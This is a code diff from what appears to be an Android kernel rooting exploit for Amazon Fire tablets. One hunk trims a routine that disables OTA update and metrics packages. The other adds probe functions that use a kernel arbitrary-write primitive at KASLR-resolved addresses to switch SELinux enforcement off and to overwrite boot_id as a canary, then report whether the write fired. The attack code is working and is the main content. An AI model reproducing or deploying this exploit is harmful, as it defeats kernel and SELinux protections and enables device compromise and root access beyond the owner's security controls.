@@ -545,35 +545,14 @@ static void run_pm(const char *action, const char *pkg) {
   }
 }
 
-static int device_is_firetv(void) {
-  char dev[PROP_VALUE_MAX] = "";
-  __system_property_get("ro.product.device", dev);
-  return strcmp(dev, "karat") == 0;
-}
-
 static void disable_ota(void) {
   static const char *tablet[][2] = {
     { "disable", "com.amazon.device.software.ota" },
     { "disable", "com.amazon.kindle.otter.oobe.forced.ota" },
   };
-  static const char *firetv[][2] = {
-    { "disable",      "com.amazon.device.software.ota" },
-    { "clear",        "com.amazon.device.software.ota" },
-    { "disable",      "com.amazon.device.software.ota.override" },
-    { "disable-user", "com.amazon.sneakpeek" },
-    { "disable",      "com.amazon.client.metrics" },
-  };
 
-  const char *(*list)[2];
-  size_t n;
-  if (device_is_firetv()) {
-    list = firetv;
-    n = sizeof(firetv) / sizeof(firetv[0]);
-  } else {
-    list = tablet;
-    n = sizeof(tablet) / sizeof(tablet[0]);
-  }
-  for (size_t i = 0; i < n; i++) run_pm(list[i][0], list[i][1]);
+  size_t n = sizeof(tablet) / sizeof(tablet[0]);
+  for (size_t i = 0; i < n; i++) run_pm(tablet[i][0], tablet[i][1]);
 
   pid_t s = fork();
   if (s == 0) { execl("/system/bin/sync", "sync", (char *)NULL); _exit(127); }
@@ -736,8 +715,83 @@ static int wait_quiet(void) {
   return stable >= 4;
 }
 
+#ifdef STAMP_STACK_FRAME_OFF
+static int probe_requested(const char *want) {
+  char buf[32] = {0};
+  read_first_line("/data/local/tmp/gl.probe", buf, sizeof(buf));
+  size_t n = strlen(want);
+  return buf[0] && strncmp(buf, want, n) == 0;
+}
+
+static int selinux_write_probe(void) {
+  uint64_t pc = kaslr_image_addr(DUMP_SKIP_ZEROES);
+  uint64_t target = kaslr_image_addr(SELINUX_ENFORCING);
+  char before[16] = {0}, after[16] = {0};
+
+  read_first_line("/sys/fs/selinux/enforce", before, sizeof(before));
+  pr_info("SELPROBE: pc=%#llx target=%#llx enforce_before=%s\n",
+          (unsigned long long)pc, (unsigned long long)target, before);
+  if (!stamp_once(pc, target)) {
+    pr_error("SELPROBE: stamp could not start\n");
+    return 0;
+  }
+  usleep(200000);
+  read_first_line("/sys/fs/selinux/enforce", after, sizeof(after));
+  if (after[0] == '0') {
+    pr_success("SELPROBE: [WRITE OK] primitive fired, enforce=%s\n", after);
+    return 1;
+  }
+  pr_error("SELPROBE: [WRITE BROKEN] enforce=%s (was %s)\n", after, before);
+  return 0;
+}
+
+static int bootid_write_probe(void) {
+  uint64_t pc = kaslr_image_addr(DUMP_SKIP_ZEROES);
+  uint64_t bd = kaslr_image_addr(BOOTID_DATA);
+  unsigned char r[16];
+  char raw[64];
+
+  pr_info("BIDPROBE: pc=%#llx target=%#llx (expect hi==target)\n",
+          (unsigned long long)pc, (unsigned long long)bd);
+  if (!stamp_once(pc, bd)) {
+    pr_warning("BIDPROBE: stamp could not start\n");
+    return 0;
+  }
+  usleep(200000);
+  if (!bootid_bytes(r, raw, sizeof(raw))) {
+    pr_warning("BIDPROBE: cannot read boot_id\n");
+    return 0;
+  }
+  uint64_t lo = 0, hi = 0;
+  for (int i = 0; i < 8; i++) {
+    lo |= (uint64_t)r[i] << (i * 8);
+    hi |= (uint64_t)r[8 + i] << (i * 8);
+  }
+  if (hi == bd) {
+    pr_success("BIDPROBE: [WRITE OK] canary matched, lo=%#llx\n",
+               (unsigned long long)lo);
+    return 1;
+  }
+  pr_warning("BIDPROBE: [WRITE BROKEN] raw=%s lo=%#llx hi=%#llx want=%#llx\n",
+             raw, (unsigned long long)lo, (unsigned long long)hi,
+             (unsigned long long)bd);
+  return 0;
+}
+#endif
+
 int root_chain_run(void) {
   stamp_prepare();
+
+#ifdef STAMP_STACK_FRAME_OFF
+  if (probe_requested("bootid")) {
+    pr_info("Root chain: GL probe mode 'bootid'; skipping the full chain\n");
+    return bootid_write_probe() ? 0 : 1;
+  }
+  if (probe_requested("selinux")) {
+    pr_info("Root chain: GL probe mode 'selinux'; skipping the full chain\n");
+    return selinux_write_probe() ? 0 : 1;
+  }
+#endif
 #ifndef ROOT_SKIP_WAIT_QUIET
   if (!wait_quiet()) {
     pr_warning("Root chain: process churn remains high; proceeding because "
